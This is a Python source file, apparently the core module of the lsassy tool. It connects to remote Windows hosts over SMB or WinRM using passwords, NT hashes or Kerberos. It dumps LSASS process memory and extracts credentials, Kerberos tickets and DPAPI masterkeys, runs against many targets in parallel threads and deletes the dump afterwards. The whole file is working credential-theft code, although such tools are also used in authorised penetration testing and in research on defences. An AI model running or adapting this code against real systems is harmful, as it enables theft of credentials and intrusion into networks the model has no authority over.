import queue
import signal
import threading
import time
from queue import Queue

from lsassy.dumper import Dumper
from lsassy.logger import lsassy_logger
from lsassy.parser import Parser
from lsassy.session import Session, WinrmSession
from lsassy.utils import get_targets
from lsassy.writer import Writer

lock = threading.RLock()


class Worker(threading.Thread):
    def __init__(self, task_q):
        super().__init__()
        self.task_q = task_q
        self.shutdown_flag = threading.Event()

    def run(self):
        while not self.shutdown_flag.is_set():
            """
            GO back to the beginning of the loop to check for ctrl+c events using timeout trick
            """
            try:
                worker_lsassy = self.task_q.get(timeout=1)
            except queue.Empty:
                time.sleep(1)
                continue
            self.name = worker_lsassy.target
            worker_lsassy.run()
            self.task_q.task_done()


class ThreadPool:
    def __init__(self, targets, arguments):
        self.targets = get_targets(targets)
        self.arguments = arguments
        self.threads = []
        self.max_threads = arguments.threads
        self.task_q = Queue(self.max_threads)
        lsassy_logger.no_color = self.arguments.no_color
        signal.signal(signal.SIGINT, self.interrupt_event)
        signal.signal(signal.SIGTERM, self.interrupt_event)

    def interrupt_event(self, signum, stack):
        lsassy_logger.error("**CTRL+C** QUITTING GRACEFULLY")
        self.stop()
        raise KeyboardInterrupt

    def stop(self):
        for thread in self.threads:
            thread.shutdown_flag.set()
        for thread in self.threads:
            thread.join()

    def isRunning(self):
        return any(thread.is_alive() for thread in self.threads)

    def run(self):
        threading.current_thread().name = "[Core]"

        try:
            # Turn-on the worker threads
            for i in range(self.max_threads):
                thread = Worker(self.task_q)
                thread.daemon = True
                self.threads.append(thread)
                thread.start()

            instance_id = 1
            lsassy_logger.debug(f"Targets: {self.targets}")
            for target in self.targets:
                self.task_q.put(Lsassy(target, self.arguments, instance_id))
                lsassy_logger.debug(f"Created target: {instance_id}: {target}")
                instance_id += 1

            # Block until all tasks are done
            self.task_q.join()
        except KeyboardInterrupt:
            lsassy_logger.error("Au revoir.")


class Lsassy:
    """
    Main class to extract credentials from one remote host. Can be used in different threads for parallelization
    """

    def __init__(self, target_name, arguments, thread_id=1):
        self.target = target_name
        self.args = arguments
        self.thread_id = thread_id

    def run(self):
        """
        Main method to dump credentials on a remote host
        """
        session, file, dumper, method = None, None, None, None

        # Credential parsing
        username = self.args.username if self.args.username else ""
        password = self.args.password if self.args.password else ""

        lmhash, nthash = "", ""
        if not password and self.args.hashes:
            if ":" in self.args.hashes:
                lmhash, nthash = self.args.hashes.split(":")
            else:
                lmhash, nthash = "aad3b435b51404eeaad3b435b51404ee", self.args.hashes

        # Exec methods parsing
        exec_methods = self.args.exec.split(",") if self.args.exec else None
        if exec_methods and "winrm" in exec_methods and len(exec_methods)>1:
            lsassy_logger.error(f"Incompatible methods winrm and {exec_methods} - can only use either winrm or others")

        # Dump modules options parsing
        options = (
            {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")}
            if self.args.options
            else {}
        )

        # Dump path checks
        dump_path = self.args.dump_path
        if dump_path:
            dump_path = dump_path.replace("/", "\\")
            if len(dump_path) > 1 and dump_path[1] == ":":
                if dump_path[0] != "C":
                    lsassy_logger.error(
                        "Drive '{}' is not supported. 'C' drive only.".format(
                            dump_path[0]
                        )
                    )
                    return False
                dump_path = dump_path[2:]
            if dump_path[-1] != "\\":
                dump_path += "\\"

        parse_only = self.args.parse_only
        dump_only = self.args.dump_only
        if parse_only and dump_only:
            lsassy_logger.error("Incompatible options dump_only and parse_only")
            return False
        keep_dump = self.args.keep_dump
        kerberos_dir = self.args.kerberos_dir
        masterkeys_file = self.args.masterkeys_file

        if parse_only and (dump_path is None or self.args.dump_name is None):
            lsassy_logger.error(
                "--dump-path and --dump-name required for --parse-only option"
            )
            return False

        try:
            if exec_methods and "winrm" in exec_methods:
                session = WinrmSession()
                self.args.port = 5985
            else:
                session = Session()
            session.get_session(
                address=self.target,
                target_ip=self.target,
                port=self.args.port,
                lmhash=lmhash,
                nthash=nthash,
                username=username,
                password=password,
                domain=self.args.domain,
                aesKey=self.args.aesKey,
                dc_ip=self.args.dc_ip,
                kerberos=self.args.kerberos,
                timeout=self.args.timeout,
            )

            if session.smb_session is None:
                lsassy_logger.warning("Couldn't connect to remote host")
                return False

            if not parse_only:
                dumper = Dumper(
                    session, self.args.timeout, self.args.time_between_commands
                ).load(self.args.dump_method)
                if dumper is None:
                    lsassy_logger.error("Unable to load dump module")
                    return False

                file = dumper.dump(
                    no_powershell=self.args.no_powershell,
                    exec_methods=exec_methods,
                    copy=self.args.copy,
                    dump_path=dump_path,
                    dump_name=self.args.dump_name,
                    **options,
                )
                if file is None:
                    lsassy_logger.error("Unable to dump lsass.")
                    return False
            else:
                file = session.correct_file_handler()(session).open(
                    share="C$",
                    path=dump_path,
                    file=self.args.dump_name,
                    timeout=self.args.timeout,
                )
                if file is None:
                    lsassy_logger.error("Unable to open lsass dump.")
                    return False

            if not dump_only:
                credentials, tickets, masterkeys = Parser(self.target, file).parse()
            file.close()

            if not parse_only and not keep_dump:
                try:
                    if session.correct_file_handler().delete(
                        session,
                        file_path=file.get_file_path(),
                        timeout=self.args.timeout,
                    ):
                        lsassy_logger.debug("Lsass dump deleted")
                except Exception:
                    try:
                        lsassy_logger.debug(
                            "Couldn't delete lsass dump using file. Trying dump object..."
                        )
                        if session.correct_file_handler().delete(
                            session,
                            file_path=dumper.dump_path + dumper.dump_name,
                            timeout=self.args.timeout,
                        ):
                            lsassy_logger.debug("Lsass dump deleted")
                    except Exception as e:
                        lsassy_logger.debug(
                            "Potential issue while deleting lsass dump: {}".format(
                                str(e)
                            )
                        )
            else:
                lsassy_logger.debug(
                    "Not deleting lsass dump as --parse-only was provided"
                )

            if not dump_only and credentials is None:
                lsassy_logger.error(
                    "Unable to extract credentials from lsass. Cleaning."
                )
                return False

            if not dump_only:
                with lock:
                    Writer(credentials, tickets, masterkeys).write(
                        self.args.file_format,
                        self.args.format,
                        output_file=self.args.outfile,
                        quiet=self.args.quiet,
                        users_only=self.args.users,
                        tickets=not self.args.no_tickets,
                        masterkeys=self.args.masterkeys,
                        kerberos_dir=kerberos_dir,
                        masterkeys_file=masterkeys_file,
                    )

        except KeyboardInterrupt:
            pass
        except Exception:
            lsassy_logger.error("An unknown error has occurred.", exc_info=True)
        finally:
            lsassy_logger.debug("Cleaning...")
            lsassy_logger.debug("dumper: {}".format(dumper))
            lsassy_logger.debug("file: {}".format(file))
            lsassy_logger.debug("session: {}".format(session))
            try:
                dumper.clean()
                lsassy_logger.debug("Dumper cleaned")
            except Exception as e:
                lsassy_logger.debug(
                    "Potential issue while cleaning dumper: {}".format(str(e))
                )

            try:
                file.close()
                lsassy_logger.debug("File closed")
            except Exception as e:
                lsassy_logger.debug(
                    "Potential issue while closing file: {}".format(str(e))
                )

            try:
                session.smb_session.close()
                lsassy_logger.debug("SMB session closed")
            except Exception as e:
                lsassy_logger.debug(
                    "Potential issue while closing SMB session: {}".format(str(e))
                )
